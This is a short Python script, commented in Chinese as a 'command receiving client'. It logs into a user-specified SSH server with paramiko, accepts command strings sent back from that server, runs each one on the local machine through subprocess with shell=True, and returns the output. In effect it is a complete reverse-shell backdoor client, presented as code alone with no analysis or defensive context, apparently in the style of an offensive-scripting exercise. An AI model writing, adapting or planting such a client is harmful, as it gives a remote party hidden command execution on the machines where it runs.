# 命令接收客户端
import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, cmd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    client.connect(ip, port=port, username=user, password=passwd)
    
    # 获取会话
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(cmd)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == "exit":
                    client.close()
                    break
                
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        
        client.close()
    return


if __name__ == "__main__":
    import getpass
    user = input("Username:")
    password = getpass.getpass()
    ip = input("Entry server ip:")
    port = int(input("Enter port:"))

    ssh_command(ip=ip, port=port, user=user, passwd=password, cmd="ClientConnected")
       